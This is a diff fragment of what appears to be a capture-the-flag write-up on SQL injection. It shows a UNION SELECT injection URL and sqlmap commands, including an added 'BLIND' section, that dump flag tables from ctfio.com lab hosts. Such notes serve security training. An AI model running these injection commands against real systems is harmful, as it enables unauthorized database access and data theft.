@@ -26,3 +26,9 @@ https://3q6m7sai.eu1.ctfio.com/article?id=' UNION SELECT 1,2,3,flag from flag-- 
 ```bash
 sqlmap -u "https://b2ybgm86.eu1.ctfio.com/api/checkuser?username=adam" --level 5 --risk 3 -p username --batch --threads 10 --dbms=mysql --dump -T flag -D sqli_three
 ```
+
+# BLIND
+
+```bash
+sqlmap -u "https://64cul97j.eu1.ctfio.com/?email=test" --level 5 --risk 3 -p email --batch --threads 10 --dbms=mysql --dump -T flag -D sqli_four
+```
